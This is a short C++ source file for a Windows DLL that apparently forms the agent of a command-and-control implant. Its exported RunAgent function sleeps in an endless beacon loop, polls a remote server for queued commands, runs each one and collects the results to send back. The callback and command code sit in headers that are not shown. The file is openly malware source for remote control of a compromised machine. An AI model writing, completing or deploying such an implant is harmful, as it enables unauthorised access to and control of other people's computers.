#include "library.h"
#include <windows.h>
#include "conf/Config.h"
#include "conf/Callbacks.h"
#include "commands/CommandHelper.h"

DLL_EXPORT void RunAgent() {
    // Setup Callback structs
    CallbackMetadata metadata;
    metadata.retrieveMetadata();
    CallbackFull cb_full;
    cb_full.metadata = metadata;
    CMD_QUEUE cmd_queue = {};

    // Beacon loop
    while (true) {
        Sleep(SLEEP);
        cmd_queue = cb_full.do_callback();

        for (const auto& cmd_map : cmd_queue) {
            for (const auto& [cmd, args] : cmd_map) {
                cb_full.data.push_back(CommandHelper::handleCommand(cmd, args));
            }
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    return TRUE;
}
